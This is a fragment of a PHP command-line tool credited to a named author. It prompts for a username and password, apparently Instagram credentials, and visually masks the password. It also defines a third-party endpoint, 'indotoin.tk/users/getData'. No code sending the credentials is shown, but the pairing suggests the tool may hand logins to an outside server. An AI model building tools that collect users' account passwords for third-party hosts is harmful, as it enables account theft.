...
$data=array('by'=>'indotoin.tk',
           'url'=>'http://www.indotoin.tk/users/getData',
            );
...
echo"\n\e[2;32mhttp://www.instagram.com/adarsh._.jayakumar";
echo"\n\e[31mCoded By Adarsh Jayakumar\n";
echo"\n".$WH."AlluAdhu".$OR."Insert Username : ";
$mu=trim(fgets(STDIN));
echo $WH."AlluAdhu".$OR."Insert Password : \e[0;30m";$mp=trim(fgets(STDIN));
echo"\e[1;36m  |Trying to login..\n";
